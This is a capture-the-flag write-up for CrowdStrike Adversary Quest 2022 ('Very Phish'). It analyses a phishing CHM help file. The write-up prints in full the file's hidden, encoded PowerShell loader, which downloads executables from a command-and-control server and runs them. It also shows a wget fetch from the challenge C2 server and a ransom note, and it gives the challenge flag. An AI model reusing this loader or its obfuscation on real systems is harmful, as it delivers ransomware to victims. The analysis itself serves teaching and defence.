# Crowdstrike Adversary Quest 2022 / Catapult Spider / #1 Very Phish

## Challenge Description

CATAPULT SPIDER is running a new malware campaign. Still primarily motivated by their greed for more Dogecoin they are now distributing a new malware loader via email. We were approached by a company that had the misfortune of having their data encrypted. Without proper EDR they were only able to identify a suspicious file that was sent to one of their employees via email. We are not sure what this file is and how it managed to infect the host, but it most likely is some type of loader that downloads further components from their command and control server. Sadly the command and control server has since been taken offline. However, we were able to find another command and control server at 116.202.161.100. This server is active, but we will need your expertise to find additional samples. Can you help us identify the trick the loader used and track down further samples that were downloaded by the loader?

Note: Flags will be easily identifiable by the format “CS{some_secret_flag_text}”. They must be submitted in full, including “CS{“ and “}”.

## TL;DR Summary

- The provided file is a Microsoft compiled help manual (CHM).
- It contains a PowerShell script that tries to download and execute four (likely) malicious files.
- The URIs have to be transcoded from the offline C2 IP address to the still working one in order to retrieve two of the files.

## Initial Analysis

It looks like the provided file is Microsoft compiled help file (CHM).

```console
$ file 9e32ac74b80976ca8f5386012bae9676decb23713443e81cb10f4456bf0e7e0b 
9e32ac74b80976ca8f5386012bae9676decb23713443e81cb10f4456bf0e7e0b: MS Windows HtmlHelp Data
```

We can unpack it with a tool l ike *7-Zip* and take a look at the overview file *doc.hhc*

```html
<!DOCTYPE HTML PUBLIC "-//IETF//DTD HTML//EN">
<HTML>
<HEAD>
<meta name="GENERATOR" content="Microsoft&reg; HTML Help Workshop 4.1">
<!-- Sitemap 1.0 -->
</HEAD><BODY>
<UL>
	<LI> <OBJECT type="text/sitemap">
		<param name="Name" value="Dogecoin">
		<param name="Local" value="doc.htm">
		</OBJECT>
	<LI> <OBJECT type="text/sitemap">
		<param name="Name" value="The doge">
		<param name="Local" value="doc1.htm">
		</OBJECT>
	<LI> <OBJECT type="text/sitemap">
		<param name="Name" value="Make Money Fast">
		<param name="Local" value="doc.htm">
		</OBJECT>
	<LI> <OBJECT type="text/sitemap">
		<param name="Name" value="Such Wow Such Doge Amaze">
		<param name="Local" value="doc1.htm">
		</OBJECT>
</UL>
</BODY></HTML>
```

While file *doc1.htm* only seems to contain a harmless dogescript, *doc.htm* has a powershell command embedded (and an introduction to Dogecoin).

```console
C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe -WindowStyle Hidden -ExecutionPolicy Bypass -NoLogo -NoProfile -EncodedCommand JAB4AHMAIAA9ACAAIgBIAFIAOABZAEgAUgBnAFoASABoAG8AZQBFAGcAWQBlAEcAQgB3AGMASABBAFoAUABSAEUAbABZAFUAMQBwAGUAVAAxAGcARQBUADEASgBQAEIAawBsAEYAUgBGADUAWQBSAFUAWQBFAFQAMQBKAFAAQgBsAGgATABSAEYAbABGAFIAMABSAEYAWABrADkAMQBUAEUAWgBMAFQAUQBSAFAAVQBrADgARwBUAFUAVgBPAFQAdwBSAFAAVQBrADgAPQAiADsACgBmAHUAbgBjAHQAaQBvAG4AIABHAGUAdAAtAEQAZQBjAG8AZABlACAAewBwAGEAcgBhAG0AKAAkAEkAKQA7AFcAcgBpAHQAZQAtAE8AdQB0AHAAdQB0ACAAKABbAFMAeQBzAHQAZQBtAC4AVABlAHgAdAAuAEUAbgBjAG8AZABpAG4AZwBdADoAOgBVAFQARgA4AC4ARwBlAHQAUwB0AHIAaQBuAGcAKAAoACgAWwBTAHkAcwB0AGUAbQAuAFQAZQB4AHQALgBFAG4AYwBvAGQAaQBuAGcAXQA6ADoAVQBUAEYAOAAuAEcAZQB0AFMAdAByAGkAbgBnACgAWwBTAHkAcwB0AGUAbQAuAEMAbwBuAHYAZQByAHQAXQA6ADoARgByAG8AbQBCAGEAcwBlADYANABTAHQAcgBpAG4AZwAoACQASQApACkAKQAuAFQAbwBDAGgAYQByAEEAcgByAGEAeQAoACkAfAAlAHsAJABfACAALQBiAHgAbwByACAANAAyAH0AKQApACkAfQA7AAoAJABzACAAPQAgAEcAZQB0AC0ARABlAGMAbwBkAGUAKAAkAHgAcwApADsACgAkAHQAPQAoACgAWwBpAG4AdAA2ADQAXQAoACQAcwAuAHMAcABsAGkAdAAoACcALAAnACkAWwAwAF0AKQAtAFsAdQBpAG4AdAAzADIAXQA6ADoATQBhAHgAVgBhAGwAdQBlACkALgB0AG8AcwB0AHIAaQBuAGcAKAAiAHgAOAAiACkAKQAKACQAcwAuAHMAcABsAGkAdAAoACIALAAiACkAWwAtADQALgAuAC0AMQBdAHwAJQB7ACQAbAA9ACQAdAAsACgAIAAiAHsAMAB9ACIAIAAtAGYAIAAoAEcAZQB0AC0ARgBpAGwAZQBIAGEAcwBoACAALQBJAG4AcAB1AHQAUwB0AHIAZQBhAG0AIAAoAFsASQBPAC4ATQBlAG0AbwByAHkAUwB0AHIAZQBhAG0AXQA6ADoAbgBlAHcAKABbAGIAeQB0AGUAWwBdAF0AWwBjAGgAYQByAFsAXQBdACQAdAApACkAIAAtAEEAbABnAG8AcgBpAHQAaABtACAAUwBIAEEAMgA1ADYAKQAuAGgAYQBzAGgAKQAsACQAXwAsACIAaAB0AHQAcAAiACwAJABzAC4AcwBwAGwAaQB0ACgAIgAsACIAKQBbADEAXQAsACIAOgAiACwAIgAvACIALAAiADAAeAAiADsAKABOAGUAdwAtAE8AYgBqAGUAYwB0ACAAUwB5AHMAdABlAG0ALgBOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQARgBpAGwAZQAoACgAIgB7ADMAfQB7ADUAfQB7ADYAfQB7ADYAfQB7ADcAfQB7ADAAfQB7ADUAfQB7ADQAfQB7ADYAfQB7ADEAfQB7ADYAfQB7ADIAfQAiACAALQBmACAAJABsACkALAAoACIAJABlAG4AdgA6AFQARQBNAFAAXAB7ADIAfQAiACAALQBmACAAJABsACkAKQA7AFMAdABhAHIAdAAtAFAAcgBvAGMAZQBzAHMAIAAoACIAJABlAG4AdgA6AFQARQBNAFAAXAB7ADIAfQAiACAALQBmACAAJABsACkAOwB9ADsACgA=
```

The base64 encoded script decodes to

```powershell
$xs = "HR8YHRgZHhoeEgYeGBwcHAZPRElYU1peT1gET1JPBklFRF5YRUYET1JPBlhLRFlFR0RFXk91TEZLTQRPUk8GTUVOTwRPUk8=";
function Get-Decode {param($I);Write-Output ([System.Text.Encoding]::UTF8.GetString((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($I))).ToCharArray()|%{$_ -bxor 42})))};
$s = Get-Decode($xs);
$t=(([int64]($s.split(',')[0])-[uint32]::MaxValue).tostring("x8"))
$s.split(",")[-4..-1]|%{$l=$t,( "{0}" -f (Get-FileHash -InputStream ([IO.MemoryStream]::new([byte[]][char[]]$t)) -Algorithm SHA256).hash),$_,"http",$s.split(",")[1],":","/","0x";(New-Object System.Net.WebClient).DownloadFile(("{3}{5}{6}{6}{7}{0}{5}{4}{6}{1}{6}{2}" -f $l),("$env:TEMP\{2}" -f $l));Start-Process ("$env:TEMP\{2}" -f $l);};
```

## PowerShell Script Analysis

We can pretty-print and debug this script a bit...

```powershell
$xs = "HR8YHRgZHhoeEgYeGBwcHAZPRElYU1peT1gET1JPBklFRF5YRUYET1JPBlhLRFlFR0RFXk91TEZLTQRPUk8GTUVOTwRPUk8=";

# From Base64 -> XOR 42
function Get-Decode {
  param($I);
  Write-Output ([System.Text.Encoding]::UTF8.GetString((([System.Text.Encoding]::UTF8.GetString([System.Convert]::FromBase64String($I))).ToCharArray()|%{$_ -bxor 42})))
};

# Decrypting $xs yields 7527234048,42666,encrypter.exe,control.exe,ransomnote_flag.exe,gode.exe
$s = Get-Decode($xs);

# Take very first value and decode it to a hex value 0xc0a87a01
$t=(([int64]($s.split(',')[0])-[uint32]::MaxValue).tostring("x8"))

# Loop over what seems to be file names encrypter.exe,control.exe,ransomnote_flag.exe,gode.exe
# 
$s.split(",")[-4..-1] | % {
  $l = $t,
    ( "{0}" -f (Get-FileHash -InputStream ([IO.MemoryStream]::new([byte[]][char[]]$t)) -Algorithm SHA256).hash),
    $_,
    "http",
    $s.split(",")[1],
    ":",
    "/",
    "0x";
  # Debug print
  $uri = "{3}{5}{6}{6}{7}{0}{5}{4}{6}{1}{6}{2}" -f $l;
  $target = "$env:TEMP\{2}" -f $l;
  Write-Output "Downloading $uri to $target";
  (New-Object System.Net.WebClient).DownloadFile(("{3}{5}{6}{6}{7}{0}{5}{4}{6}{1}{6}{2}" -f $l),("$env:TEMP\{2}" -f $l));
  # De-arm this script by commenting out Start-Process
  #Start-Process ("$env:TEMP\{2}" -f $l);
 };
```

... which yields the following output:

```txt
Downloading http://0xc0a87a01:42666/C84BEE34284DA6BBDD16859BB9B961D8A3B32D49D6276676F46798EA510034E4/encrypter.exe to C:\Users\x\AppData\Local\Temp\encrypter.exe
Exception calling "DownloadFile" with "2" argument(s): "Unable to connect to the remote server"
[...]
Downloading http://0xc0a87a01:42666/C84BEE34284DA6BBDD16859BB9B961D8A3B32D49D6276676F46798EA510034E4/control.exe to C:\Users\x\AppData\Local\Temp\control.exe
[...]
Downloading http://0xc0a87a01:42666/C84BEE34284DA6BBDD16859BB9B961D8A3B32D49D6276676F46798EA510034E4/ransomnote_flag.exe to C:\Users\x\AppData\Local\Temp\ransomnote_flag.exe
Downloading http://0xc0a87a01:42666/C84BEE34284DA6BBDD16859BB9B961D8A3B32D49D6276676F46798EA510034E4/gode.exe to C:\Users\x\AppData\Local\Temp\gode.exe
[...]
```

So it looks like the value decrypted value 7527234048 (`$s.split(',')[0]`) is decoded to `0xc0a87a01`, which is used as an IPv4 address to download files from. 

So what are the URI components?

| URI component | Value | Meaning |
| --- | --- | --- |
| 1 | 0xc0a87a01 | Hex encoded IPv4 address 192.168.122.1 |
| 2 | 42666 | Server TCP port number |
| 3 | C84BEE34284DA6BBDD16859BB9B961D8A3B32D49D6276676F46798EA510034E4 | Upper cased SHA256 hash value of hex encoded IPv4 address without prefix 0x |
| 4 | encrypter.exe,control.exe,ransomnote_flag.exe,gode.exe | Names of files to download and execute via Start-Process |

The private range IPv4 address `192.168.122.1` is obviously not reachable. But we do know the URI scheme now!

## Now it's Flag Time!

We know from the challenge description that the C2 server at `116.202.161.100` is still online.

- The hex encoded IPv4 address without prefix 0x is `74caa164`.
- The SHA256 value of that is `F5D3271FE6D59C185D85353DFB8794A4FF9B7BDD5661FCCF356766998B6D276B`.

We can now try to download the files from this C2 server.

```console
$ wget -q http://116.202.161.100:42666/F5D3271FE6D59C185D85353DFB8794A4FF9B7BDD5661FCCF356766998B6D276B/{encrypter.exe,control.exe,ransomnote_flag.exe,gode.exe}
$ ls -l *.exe                
-rw-r--r-- 1 501 dialout 56704495 Jul  6 10:53 control.exe
-rw-r--r-- 1 501 dialout   798859 Jul  6 10:51 ransomnote_flag.exe
```

Looks like only two of the four files are still available.

The file `ransomnote_flag.exe` contains interesting strings

```txt
Such network such been penetrated.
Wow files on such hosts in the network many encrypted with amaze algorithm.
Backups wow such encrypted many deleted such backup disks much formatted.
Shadow copies so removed, many F8 or such other methods many damage encrypted data sad not recover.
Doge exclusively have decryption software such your situation. No decryption software many available in public.
DO NOT RESET OR SHUTDOWN - files very danger. such damaged.
DO NOT RENAME OR MOVE such encrypted wow readme files.
DO NOT DELETE readme files wow.
Such lead very the impossibility of recovery many certain files.
To get info (decrypt your files) contact us at: AllYourDogeAreBelongToUs@protonmail.com
Dogecoin wallet: DJR6L7PeDcen9GFzoJnPioRd1tV3wt9X3p
Flag: CS{such_p0werSHELL_very_ScRIPT_wow}
- Doge
No system such safe
```

Flag: **CS{such_p0werSHELL_very_ScRIPT_wow}**
